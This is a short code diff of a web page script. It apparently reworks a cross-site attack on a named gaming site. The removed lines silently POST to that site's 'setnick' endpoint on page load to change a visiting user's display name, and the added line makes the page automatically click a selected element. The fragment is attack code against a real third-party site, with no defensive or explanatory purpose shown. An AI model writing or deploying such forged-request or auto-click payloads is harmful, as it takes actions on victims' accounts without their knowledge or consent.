@@ -16,11 +16,7 @@
 <script>
     (async () => {
         try {
-            const payload = "https://brygadagraczy.pl/panel.php?a=setnick";
-            const response = await axios.post("https://brygadagraczy.pl/panel.php?a=setnick", {
-                displayname: "Qwizii",
-                changeNick: ''
-            })
+            document.querySelector(button).click();
         } catch (e) {
             console.log(e);
         }
